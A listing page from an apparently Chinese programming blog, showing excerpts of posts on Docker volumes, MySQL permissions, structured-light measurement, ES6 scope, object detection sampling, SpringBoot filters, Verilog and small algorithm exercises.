			<a href="/posts/2681f7fb4bcd1e525996d4a41522d6b1/" rel="bookmark">
			Docker中实现多个容器数据共享以MySQL为例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据卷容器 创建docker02创建docker03实现多个mysql数据共享 多个mysql容器数据同步。 创建docker02 docker run -it --name docker02 --volumes-from docker01 lieon/centos:1.0 会发现docker02也有2个数据卷就是docker01的数据卷
在docker01中加入数据在docker02中也会出现
cd volume01 touch docker01 docker02继承了docker01的卷，通过--volumes-from
创建docker03 docker run -it --name docker03 --volumes-from docker01 lieon/centos:1.0 cd volume01 touch docker03 数据在docker01中也会出现，退出之后，数据仍然存在。
实现多个mysql数据共享 docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7 docker run -d -p 3310:3306 --volumes-from mysql01 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 mysql:5.7 可以实现容器之间数据共享。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8d57ecfd5c54474534975271b0b7a99/" rel="bookmark">
			解决Python报错：PermissionError: [Errno 13] Permission denied
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个错误是因为文件不存在或者文件已经被打开了，导致python没有权限去读写它。
建议：
①先去检查文件是否存在。
②检查这个文件有没有打开。如果被打开的话，那么python是没有权限对它进行读写的。
注意的是，有一些c盘的文件需要管理员授权（当然这个问题一般是[WinError 5] 拒绝访问的时候才出现）
③把读写路径改为相对路径。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58fbc744dfd0cafdd2c1696857d14f43/" rel="bookmark">
			基于相移法的结构光三维测量技术
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 结构光三维测量原理 1.1 单目结构光系统 结构光投影三维测量系统主要由一个CCD相机、投影仪和PC机组成，如图所示。首先在PC上进行结构光编码，通过投影仪将编码好的结构光投影至物体表面，再由数字相机拍摄受物体表面调制的结构光图像，图像最后传至PC进行解码，将解码信息还原成物体的三维高度信息。下图给出条纹结构光的系统图。
1.2 结构光投影三维测量原理 计算机编码的一系列正弦条纹图案经投影仪 P 投射到被测物体表面上，条纹图经物体表面调制后携带深度信息，相机 C 采集得到一系列变形条纹图。图中，D 为被测物体表面上一点，投射到D点的一束光线为 PD，将其延长刚好交参考平面 R 于点 A 。光线 DC 为相机接收到的 D 点的反射光线，将其反向延长刚好交参考平面与点 B 。由于编码图案为正弦条纹图，同一条投射光线上的相位值相等，即 D 和 A 点的相位值相等。同样的，相机采集到的反射光线 DC 上，D 点的相位和 B 点的相位相等。因此，参考平面上 A 点与 B 点间的相位差与变形条纹上的 D 点的深度有关。
以上这些公式好像只是一个去除了量纲的理论模型，不太准确，只是为了说明相位差和高度有关，后面再回来看
2. 相移法概述 结构光主要研究其编解码的方法，按照编码的方式来划分的话，结构光可以分为时序编码、空间编码和直接编码，其中时序编码和空间编码都拥有其各自的优点，而受到广泛的使用。其中时序编码中的相移法由于其算法简单，精度高，得到广泛的研究与应用。因此，本文主要针对时序编码中的相移法进行讲解，相移法也叫相位测量轮廓术（PMP）。
相移法主要是通过投影多幅具有相位差的结构光图像来获得相位信息，常见的几种算法有三步相移法、四步相移法和五步相移法。传统相移法中条纹光栅的投影往往通过机械移动来实现相移，这大大降低了测量精度，近些年由于DLP等投影技术的发展，相移可以通过PC机编程结合DLP投影的方式实现准确相移，测量精度较传统方法有了很大的提高。
2.1 相移法存在的问题 相移法存在一些问题：
投影的非线性问题包裹相位展开问题相位误差补偿问题 2.1.1 投影的非线性问题 投影仪普遍存在Gamma非线性关系，正弦结构光图案经过投影并由相机拍摄后，获得的图像并不具备良好的正弦性。在三维测量的过程中，直接使用这种未经矫正的图案会导致相位误差。因此，系统需要对投影仪进行精确的非线性矫正才能得到良好的三维重建效果。
2.1.2 包裹相位展开 在相移法中，包裹相位（也叫折叠相位）的获取是通过四象限反正切函数获得的，相位局限在[-π，π]范围内，最终的绝对相位需要通过相位展开或相位解包裹的方式获得。由于环境光、噪声、阴影等因素的影响，很容易造成相位展开的错误。因此，如何准确的进行包裹相位的展开成为提高三维测量精度的一个难点。目前求解绝对相位有很多成熟的方法：
格雷码法多频外差法倍频法phase-coding法… 将相位转化为三维点云也有很多经典的方法，例如（1）相位差法（2）东南大学达飞鹏老师的8参数方法（3）反向相机方法。后两种方法最为灵活，应用相对也更为广泛。
2.1.3 相位误差补偿 传统相移法主要通过机械移动的方式实现相位移动，而由于机械装置的精度关系，经相机拍摄得到的相移图像 经过图像处理后，得到的包裹相位图往往带有带有很大的相位误差，从而造成测量精度的降低。而随着DLP投影技术和PC技术的发展，现在可以利用编程实现图像的精确相移，大大减小了因为相移带来的相位误差。现在的相位误差主要由投影仪的非线性造成。
2.2 相移法原理 相移法主要是通过投影多幅具有相位差的结构光图像来获得相位信息。对于常见的等相移步距的 N 步相移法，其第 n ( n = 1 , 2 , 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58fbc744dfd0cafdd2c1696857d14f43/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ca6b48c8dc52191e77f50679f5a0377/" rel="bookmark">
			DockerFile实战------如何编写一个docker镜像并且挂载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DockerFile实战------如何编写一个docker镜像并且挂载 新建dockerfile创建镜像镜像 Dockerfile就是用来构建docker镜像的文件，命令脚本 新建dockerfile 创建docker-test-volume目录，通过编写脚本生成镜像，镜像是一层一层的，脚本的每个命令就是一层。
mkdir docker-test-volume //创建docker-test-volume目录 cd mkdir docker-test-volume //进入创建docker-test-volume目录 vim dockerfile1 //编写脚本 FROM centos // 有的地方是 FROM scratch 而不是centos 其是引导加载 VOLUNE ["volume01","volume02"] //匿名挂载 CMD echo ".....end....." CMD /bin/bash 注：scratch 引导加载
创建镜像镜像 利用dockerfile01创建docker镜像
docker build -f /home/dcoker-test-volume/dockerfile -t lieon/centos:1.0 . //最后的点表明生成在当前目录下，如果丢失则创建镜像失败 运行镜像
docker run -it [镜像id] /bin/bash 查看目录,发现生成镜像时候自动挂载的目录在最后2处。通过docker inspect可以查看外部的挂载路径，通过修改容器内的数据，外部也会跟着改变。
ls -l 这种创建镜像时就挂载，是经常用的一种挂载方式，因为通常要构建自己的镜像。如果构建镜像时没有挂载卷，运行时要手动镜像挂载 -v 卷名：容器内路径。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/749cce23fae04b3111c4f6e4cc9523e5/" rel="bookmark">
			ES6块级作用域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、在es5语法中，只有全局作用域和函数作用域，是没有块级作用域这个概念的，从而会导致一些特殊的情况
1、内层变量可能会覆盖外层变量
var tmp = new Date(); function f() { console.log(tmp); if(false){ var tmp = 'hello word'; } } f()//undefined 2、用来计数的循环变量泄露为全局变量
var s = 'hello'; for(var i = 0; i &lt; s.length; i++){ console.log(s[i]); } console.log(i);//5 二、es6的块级作用域
1、外层代码块不受内层代码块的影响
function f1() { let n = 5; if(true){ let n = 10; } console.log(n); } f1()//5 2、es6允许块级作用域的任意嵌套，内层作用域可以定义外层作用域的同名变量
{{{{ let name = 'lisi' { let name = 'wanger' console.log(name); } console.log(name); }}}} //运行结果 // wanger // lisi 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e2d15fc0171c36fe6e3f5e827b4fbc5/" rel="bookmark">
			解决mysql8 提示 ERROR 1410 (42000): You are not allowed to create a user with GRANT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天为创建的root 用户授予相关权限提示如下错误：
mysql&gt; grant all privileges on test.* to root@'%' identified '123456';
提示如下错误：ERROR 1064(4200): you have an error in you SQL syntax; **near 'identified '123456'' at line 1
查询MySQL8 相关授权资料的得知，分配权限不能带密码。
修改后的指令如下：
mysql &gt; grant all privileges on test.* to root@'%'
提示的错误信息如下：You are not allowed to create a user with GRANT;
产生用户不能授权的原因是mysql 数据库中user 表中的特定用户(root) 的host 的属性值为localhost.
解决办法如下：
# 使用mysql 数据库
mysql &gt; use mysql;
# 特定用户的host 修改
mysql &gt; update user set host='%' where user='root';
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e2d15fc0171c36fe6e3f5e827b4fbc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/648644a2c9876203c18b6679d5dcf00a/" rel="bookmark">
			检测中的不平衡问题及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类间不平衡（class imbalance）尺度不平衡（scale imbalance） 空间不平衡（spatial imbalance）多任务不平衡（objective imbalance）背景-前景不平衡前景-前景不平衡目标尺寸不平衡特征尺度不平衡 定义 类间不平衡: 属于不同类别的样本数量差异显著。
前景-背景不平衡：正负例样本数量差异显著，比如rpn提出的候选框负例远大于正例。前景-前景不平衡：检测的目标其出现频率在数据集中存在差异，比如人出现的频率比熊高。 尺度不平衡：检测目标有不同的尺度，不同数量的样本属于不同的尺度（也即是说相同尺度的检测目标的数量不等，比如在COCO数据集中，大部分检测目标的尺度较小）。
目标尺度不平衡：检测目标尺度差异显著。特征尺度不平衡：为解决目标尺度不平衡，使用较多的方案是结合多层特征用于预测，结合多层特征时就会出现特征尺度不平衡问题，也就是高层语义特征与底层细节特征的差异。 空间不平衡：指边界框的空间属性（eg.大小，位置）的不平衡，也即不同的边界框对回归损失的贡献不平衡，比如说回归任务时损失函数选择不当，那么可能就会出现边框位置轻微移动，而损失大幅波动的情况，也可能相反，具有较高得分的边框和较低得分的边框损失差距却很小，
多任务不平衡：指在训练网络时多任务loss函数的不平衡。目标检测需要多任务损失，以便同时解决分类和回归任务。
解决方案 前景背景不平衡 做法包括但不限于：
硬采样：
1. 按照设定的比例随机采样正负样本用于训练，比如1：1，1：3。
2. 在线困难样本挖掘 OHEM：随机硬采样的方法认为较为平衡的正负样本能带来更好的训练效果，而OHEM基于这样的假设：训练更多困难的样本更能带来好的效果，困难的样本在OHEM中被认为是损失较大的样本。于是OHEM先前向计算得到每个样本的损失，前B个较大损失的样本用于反向传播训练网络，其余样本则不参与。
软采样：动态地为样本赋予（0，1）间的权重，（硬采样相当于只取{0，1}），不同计算权重的方式引出了不同的方法，比如：Focal Loss，权重，以及GHM，PISA等。
生成方法：通过人工生成样本注入到数据集中，比如基于GAN的方法 Adversarial-Fast-RCNN，该方法产生具有遮挡和变形的困难样本用于训练。比如 Progressive and Selective Instance-Switching(PSIS)，该方法根据视觉上下文，在一对图像上交换属于相同类的两个对象，产生新的样本。
前景前景不平衡在目标检测相关研究较少，图像分类里蛮多的。
目标尺度不平衡 尺度不平衡就是检测目标的大小具有多样性。解决尺度不平衡问题也就是解决如何有效检测出多尺度目标。主要方案有三种，基于图像金字塔的方法(d)，基于特征金字塔的方法(c)，以及基于图像和特征金字塔的混合方法 (e)。
基于图像金字塔的方法：SNIP，SNIPER，内存和计算代价大，但是效果较好，毕竟特征金字塔也是为了对图像金字塔做一个近似。
基于特征金字塔的方法：众所周知的FPN，但是FPN融合高低特征的过程引出了新的不平衡-特征不平衡。
基于特征和图像金字塔的混合方法：Efficient Featurized Image Pyramids，Enriched Feature Guided Refinement Network ，Scale Aware Trident Networks等。
特征尺度不平衡 FPN处会出现特征不平衡，常理来说融合高低层特征时都会出现这种不平衡，语义分割模型里也是如此。至于为什么归纳在尺度不平衡中可以这样理解，一个目标在高低层处的特征尺度是不一样的。比如一个16x16的目标，在底层的特征尺度为8x8，而在高层就只有1x1。当然本质上还是高低层特征的语义信息差异较大。方法很多，一类是在FPN的基础上提升，一类是提出完全崭新的结构。
在FPN基础上做提升的有：PANet，Libra FPN。
新结构：Scale Transferrable Detection Network. Parallel FPN. Deep Feature Pyramid Reconfiguration.Zoom Out-And-In Network.Multi-Level FPN. NAS-FPN. 等等。
讨论
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/648644a2c9876203c18b6679d5dcf00a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70531f6af1bcfeb2fc737e1969e6d382/" rel="bookmark">
			LCIS （线性DP，滚动数组）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LCIS 分析： 最长公共上升子序列先按常规打下来 O ( n 3 ) O(n^3) O(n3) f i , j f_{i,j} fi,j​ 表示以 a [ i ] , b [ j ] a[i],b[j] a[i],b[j] 结尾( a [ i ] , b [ j ] a[i],b[j] a[i],b[j]作为最后的结尾)的 L C I S LCIS LCIS O ( n 3 ) O(n^3) O(n3) #include &lt;bits/stdc++.h&gt; using namespace std; const int N=3005; int a[N],b[N],f[N][N]; signed main() { ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0); int n,m; cin&gt;&gt;n; for(int i=1;i&lt;=n;i++) cin&gt;&gt;a[i]; m=n; for(int i=1;i&lt;=m;i++) cin&gt;&gt;b[i]; int ans=0; for(int i=1;i&lt;=n;i++) { for(int j=1;j&lt;=m;j++) { if(a[i]==b[j]) { for(int k=0;k&lt;j;k++) // 去找最长的子状态 { if(b[k]&lt;b[j]) f[i][j]=max(f[i][j],f[i-1][k]+1); } ans=max(ans,f[i][j]); } else f[i][j]=f[i-1][j]; } } cout&lt;&lt;ans&lt;&lt;endl; /*for(int i=1;i&lt;=n;i++) { for(int j=1;j&lt;=n;j++) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70531f6af1bcfeb2fc737e1969e6d382/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e4734d3a0668e0495036f680e407b53/" rel="bookmark">
			CUDA编程--邻近点查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面的话：建议先看完本专栏的前三篇文章再看这篇
本文将介绍如何了查找点云中每个点的邻近点并统计个数
取点云文件 我给了个demo文件，在input文件夹下面，其每行为一个点，每行分别有4个数：index， x， y, z
0 0.190818 2.151146 1.516178 1 0.182662 2.208185 1.506151 2 0.212130 2.120995 1.519654 3 0.195404 2.216945 1.554745 4 0.177847 2.420602 1.464208 5 0.108176 2.408980 1.471528 6 0.285591 2.271129 1.526475 ........................... 82881 2.856293 4.802210 0.886675 82882 2.893785 4.858056 0.938935 读取函数如下：
float* read_pc(string filename, float xyz[]){ ifstream fin; fin.open(filename); if(!fin) { cout &lt;&lt; filename &lt;&lt; " file could not be opened\n"; exit(0); } int idx; float x, y, z; while(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e4734d3a0668e0495036f680e407b53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4988dae7afaf6ab32bf1306ebf5ceea3/" rel="bookmark">
			MPAndroidChart详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 MPAndroidChart是一款基于Android的开源图表库，MPAndroidChart不仅可以在Android设备上绘制各种统计图表，而且可以对图表进行拖动和缩放操作，应用起来非常灵活。
基本使用 创建视图
两种方式 .xml中定义它&lt;com.github.mikephil.charting.charts.LineChart android:id="@+id/chart" android:layout_width="match_parent" android:layout_height="match_parent" /&gt; java代码动态创建,并将声明的对象放到视图中LineChart chart = new LineChart(Context); 添加数据
想要给图表设置数据，必须通过setData()方法 public void setData （ChartData data ）{ ... } ChartData类里面封装了呈现期间所需图表的所有数据和信息，使用每一种图表需要使用其对应的子类
例如:LineChart对应LineData
这时你会看到构造函数有以下方法，同时LineData也有addDataSet()方法 public LineData(List&lt;LineDataSet&gt; sets) { ... } public LineData(LineDataSet...) { ... } 一个DataSet对象表示当前Chart的一种类型数据，它可以将Chart中加入不同的类型，其允许特定样式。
例如：一个折线图，可能不光有当天的温度和湿度变化，还有前几天的变化
LineDataSet构造函数如下 public LineDataSet （List &lt;Entry&gt; entries，String label ）{ ... } List类型的Entry封装了图表的所有值，要向图表添加数据，需要将每个数据对象包装到Entry对象，Entry类表示单个数据
注意:mpAndroidChart不同版本有一定差异，方法参数会有一定的差异，总体思路基本一致，注意看方法的参数，和异常信息!!! 更新视图
使用invalidate()方法刷新数据
如果是动态添加数据需要notify
lineDataSet.notifyDataSetChanged(); lineData.notifyDataChanged(); lineChart.notifyDataSetChanged(); lineChart.invalidate(); 手势交互 setTouchEnabled(boolean enabled)：允许启用/禁用与图表的所有可能的触摸交互setDragEnabled(boolean enabled)：启用/禁用图表的拖动（平移）setScaleEnabled(boolean enabled)：启用/禁用两个轴上的图表缩放setScaleXEnabled(boolean enabled)：启用/禁用x轴缩放setScaleYEnabled(boolean enabled)：启用/禁用y轴缩放setPinchZoom(boolean enabled)：如果设置为true，则启用缩放缩放。如果禁用，则可以单独缩放x轴和y轴setDoubleTapToZoomEnabled(boolean enabled)：将此设置为false以禁止通过双击来缩放图表 颜色设置 通过DataSet对象的setColor()或setColors()设置颜色,也可选择已经提供好的颜色集颜色集合在ColorTemplate类中
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4988dae7afaf6ab32bf1306ebf5ceea3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13a03441af6c41c8ded8c1505a986550/" rel="bookmark">
			SpringBoot——SpringBoot使用过滤器Filter
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 SpringBoot使用过滤器Filter SpringBoot中使用过滤器Filter有两种方式
方式一： 通过注解方式实现
方式二：通过 Spring Boot 的配置类实现
2 方式一： 通过注解方式实现 首先先写一个过滤器Filter，在类的上方使用 @WebFilter 注解来创建Filter即可
package com.liuhaiyang.springboot.filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; //过滤器 @WebFilter(urlPatterns = "/myfilter") public class MyFilter implements Filter { @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println("---------您已进入过滤器----------"); filterChain.doFilter(servletRequest,servletResponse); } } 在SpringBoot项目的入口类上方使用注解 @ServletComponentScan 扫描filter包中的注解
package com.liuhaiyang.springboot; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.boot.web.servlet.ServletComponentScan; @SpringBootApplication @ServletComponentScan(basePackages = "com.liuhaiyang.springboot.filter") //第一种方式 public class SpringbootTest14Application { public static void main(String[] args) { SpringApplication.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13a03441af6c41c8ded8c1505a986550/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eded4acdd53bf2a8cf472eba4108f292/" rel="bookmark">
			关于 Faster RCNN正负样本选取的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 faster rcnn的解读这两篇文章写的很好，很清楚。面试时被问了这个问题，专门记录下来。
一文读懂Faster RCNN从编程实现角度学习Faster R-CNN（附极简实现） 回顾fast rcnn样本选取问题 在faster rcnn 中，首先通过selective search 产生了2000个候选框，在进行一个批次训练的时候选择R_sel个框进行训练（文中batch size=128），一个mini-batch中正负样本的比例按照1：3选取，且与groundtruth的IoU&gt;=0.5的为正样本，0.1&lt;IoU&lt;0.5的为负样本。
P.S. 这里设置为0.1的原因是，作者认为与groundtruth有一定交叠的背景更可能是比较困难的负样本，这样选择负样本有助于收敛和提高准确性，但不难发现，这种选取方法忽略了一些重要的及困难的背景区域。
faster rcnn的正负样本选取问题 faster rcnn相比fast rcnn，主要贡献之处在于提出了RPN（区域建议网络，Region Proposal Networks）代替selective search去获得候选框。网络在训练时先训练rpn网络，这时训练好的rpn网络的作用就类似于selective search 提供候选框，然后再训练rcnn网络。（这是一个迭代的过程，具体见[1]）
因此faster rcnn有两次选择正负样本的操作，一次发生在RPN部分，RPN可以产生（提出）大约20,000个框[1]，其中大量的框都是无目标的背景，因此要进行选择平衡的正负样本用于训练RPN。在训练了RPN后，我们训练rcnn，先通过RPN产生大约20,000个预测框，通过对前景概率排序，NMS等系列操作（具体见[2]），得到了2000个候选框，与上述的fast rcnn 相同，这2000个候选框也不是全部用于训练，于是出现第二次样本选择。
RPN的正负样本选择 RPN将20000多个候选的anchor选出256个anchor进行分类和回归位置。选择过程如下：
对于每一个ground truth bounding box（gt_bbox），选择和它重叠度（IoU）最高的一个anchor作为正样本。
对于剩下的anchor，从中选择和任意一个gt_bbox重叠度超过0.7的anchor，作为正样本，正样本的数目不超过128个。
随机选择和gt_bbox重叠度小于0.3的anchor作为负样本。负样本和正样本的总数为256。
rcnn的正负样本选择 2000个候选框不是都拿去训练，而是利用选择128个用以训练。选择过程如下：
候选框和gt_bboxes 的IoU大于0.5的，选择一些作为正样本（比如32个）。
选择 RoIs和gt_bboxes的IoU小于等于0（或者0.1）的选择一些（比如 128-32=96个）作为负样本。
补充 OHEM（在线困难样本挖掘，Online Hard Example Mining） OHEM也是一种对正负样本的采样，OHEM的主要思想认基于这样一个假设：更多地训练困难样本可以提升网络的性能，OHEM认为困难样本即损失较大的样本。
上图以fast rcnn为例说明OHEM的过程，（绿色）对于每一个候选框Ri，只进行前向传播，计算Ri的损失，然后选择损失最大的（比如128）个样本，被认为是困难样本，进行反向传播的训练（红色），最后将学习的参数同步更新到绿色区域的网络。
值得注意的是，fast rcnn中一个mini-batch中正负样本的比例按照1：3选取，而OHEM移除了这个设定。
再值得一提的是，与OHEM相反，在PISA中的作者提出更倾向关注那些与gt目标有最高IOU的样本（更小的loss）。
目标检测中的样本不平衡处理方法——OHEM, Focal Loss, GHM, PISA
错误之处，请大家在评论区指正~。: ) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67d57d74a8068b38050ca7ccaf43d47c/" rel="bookmark">
			实验二：通过SQL语句创建与管理数据表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 实验目的一、通过SQL语句删除表二、通过SQL语句创建表三、通过SQL语句管理表结构1.添加和删除列2.添加和删除约束 四、通过SQL语句添加、修改、删除表中数据1. 插入数据2.修改数据3.删除数据 小结 实验目的 （1）掌握查询分析器的使用。
（2）掌握通过SQL语句创建表的方法。
（3）掌握通过SQL语句修改表结构的方法。
（4）掌握通过SQL语句添加、修改、删除表数据的方法。
一、通过SQL语句删除表 用SQL语句在数据库Student_info中删除实验一创建的Student表、Course表、SC表。
由于这三个表外键关联了，所以单独删除会出现”无法删除“的错误
所以先删除表的外键约束
然后就可以删除表了
我这里的表下面有红色波浪线是因为我已经把表删掉了
二、通过SQL语句创建表 用SQL语句在数据库Student_info中创建实验1中的Student表,Course表,SC表,表结构如实验一中的表B.2 , 表B.3 , 表B.4所示
首先使用student_info数据库
然后再创建表
三、通过SQL语句管理表结构 1.添加和删除列 a．给Student表增加身高（以米单位）stature列，类型为numeric（4，2），允许为空值，且身高值需小于3.0米。
b．给Student表增加所在系Sdept列，字符型，长度2，不允许为空值。
c．给Student表增加邮政编码Postcode列，字符型，长度为6，可以为空，若不为空时，则要求其值只能出现数字，不能是其他字符。
d.删除Student表中的身高列stature
发生错误,所以应先删除约束,约束名称如上图中框起来的,然后再删除列
2.添加和删除约束 a．在Student表添加约束：入学时间必须在出生年月之后。
b．给SC表的成绩grade列增加默认值约束，默认值为0。
c．删除grade列的默认值约束。
四、通过SQL语句添加、修改、删除表中数据 1. 插入数据 a．Student表、Course表、SC表的记录见实验一的表B.5、表B.6、表B.7，其他数据可自行添加。要求Student表和SC表中数据包括了每位同学自己的学号。
Student表
Course表
SC表
b．执行如下语句：insert into student（sno，sname，sex）values（‘20101101’，‘赵青’，‘男’），该语句能成功执行吗？为什么？
不能,因为Sdept列不允许为空值
c．执行如下语句：insert into sc values（‘20110103’，‘005’，80），该语句能成功执行吗？为什么？
不能,因为SC表与Course表的列Cno外键关联,由于Course表中的Cno列没有’005’的数据,所以不能执行成功
2.修改数据 a．使用T-SQL语句，将Course表中的课程号为’002’的学分改为4，总学时改为64。
b．使用T-SQL语句，将SC表中的选修了’002’课程的同学的成绩*80%。
3.删除数据 a．使用T-SQL语句，删除选修了“C语言程序设计”的学生的选课记录。
b．使用T-SQL语句，删除所有的学生选课记录。
说明：删除后，请重新插入SC表中的记录。
重新插入SC表
小结 通过本次实验,我基本掌握了用SQL语句创建表,对表的增删改查操作,还有对表添加一些基本的约束,在对表中的数据进行增删改时,要特别注意一些约束,由于约束的存在，对表进行操作时会出现错误。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f009e55583f170ae073119f880ec928/" rel="bookmark">
			Verilog 语言细节
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Verilog 语言细节 一、关于常量 1.1 负数 ​ 负数在verilog里是按照补码储存的，也就是说 − 2 ′ b 1 = 11 -2'b1 = 11 −2′b1=11，但是需要注意的是，在比较的时候，是无符号的比较，也就是说 − 2 ′ b 1 &gt; 2 ′ b 0 -2'b1 &gt; 2'b0 −2′b1&gt;2′b0 这个事情是对的。更离谱的是， − 2 ′ b 1 = = 2 ′ d 3 -2'b1 == 2'd3 −2′b1==2′d3 这件事也是对的，在表达式中运算的时候也是这样的。
1.2 参数 ​ parameter的提出我一开始以为他是多余的，因为define可以代替，后来这个跟C不一样，每次用define定义的宏，宏前面都是需要带 “ ’ ” 符号的，所以写起来太不方便了。常见的还是用parameter比较方便，但是因为define还是有用的，因为parameter的右式必须是符合表达式规则的，但是define就没有这个要求。
1.3 数据截断 ​ verilog里面的数的位宽极为重要，这是因为其实数本身不是真的那个特别抽象的，可以用来描述世界上一切事物的数字，而是更狭隘的只一簇数据线上的高低电平，对于每个1 + 1，在verilog中都是两个输入经过一个加法器，然后得到一个输出，是有具体硬件基础的。所以位宽及其重要。
​ 首先强调一下位宽概念，位宽说的是把这个数用二进制表示后的位数，所以即使是写成 3’dx 这种最大值也不是十进制的999（十进制最大的三位数），而是十进制的7（二进制最大的三位数）。
​ 我认为比较容易犯的错误，就是是数据截断，比如对于一个四位宽数与另一个四位宽数求和，我们知道四位宽数最大是十进制的15，在数学上，他们的和最大是30，但是在verilog，它还是15，因为输出的位宽是两个运算数的最小值，所以还是四位宽，最大是15。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f009e55583f170ae073119f880ec928/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ffb6feaed51b9d29adb956bce56f75d/" rel="bookmark">
			Algo_math、判断两圆包含
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个圆A（(X,Y)圆心，R为半径），圆B（(x,y)圆心，r为半径）。 判断：圆B 是否在 圆A 的内部。 （上图，则不包含）
等价于： 绿线长度 &lt;= R
( X − x ) 2 + ( Y − y ) 2 + r ≤ R \sqrt{ (X - x)^2 + (Y - y)^2 } \ + r \le R (X−x)2+(Y−y)2 ​ +r≤R
但这涉及到sqrt，很简单就可以消除掉sqrt！！！
( X − x ) 2 + ( Y − y ) 2 ≤ ( R − r ) 2 (X - x)^2 + (Y - y)^2 \le (R - r)^2 (X−x)2+(Y−y)2≤(R−r)2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03efe7252c559f29555d9bddd330ea29/" rel="bookmark">
			数据结构，猴子选大王C语言循环链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		n只猴子要选大王，选举办法如下：所有猴子按1、2、3、……、n编号围坐一圈，从第1号开始按照1、2、3、……、m报数，凡报m号的退出圈外，如此循环报数，直到圈内剩下一只猴子时，这只猴子就是大王。n和m由键盘输入，打印出最后剩下的猴子号码。
如果用单向循环链表实现。
//循环链表 #include&lt;stdio.h&gt; typedef struct node { struct node *next; int data; }Li; //初始化循环链表 Li *Init() { Li *L; L=(Li*)malloc(sizeof(Li)); L-&gt;data=1; L-&gt;next=L; return L; } //尾插法 因为顺序和插入顺序一样 Li* Insert(Li *r,int e) { Li *q;//r指向最后结点 q=(Li*)malloc(sizeof(Li)); q-&gt;data=e; //r-&gt;next=q;错误 单链表插入先动后在动前 警示 //q-&gt;next=r;错误 q-&gt;next=r-&gt;next; r-&gt;next=q; r=q;//r永远指向尾结点 return r; } void Creat(Li *l,int e) { Li *r=l;//r为尾结点 int n; for(n=2;n&lt;=e;n++) { r=Insert(r,n); } } void Dawang(Li *l,int k)//k为每次删除的位置 n为多少只猴子 { Li *p=l,*q; int j;//计数器 while(p-&gt;next!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03efe7252c559f29555d9bddd330ea29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc0610a9390f3b1b374953e3d2cfae9f/" rel="bookmark">
			Android APK反编译详解（附图）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
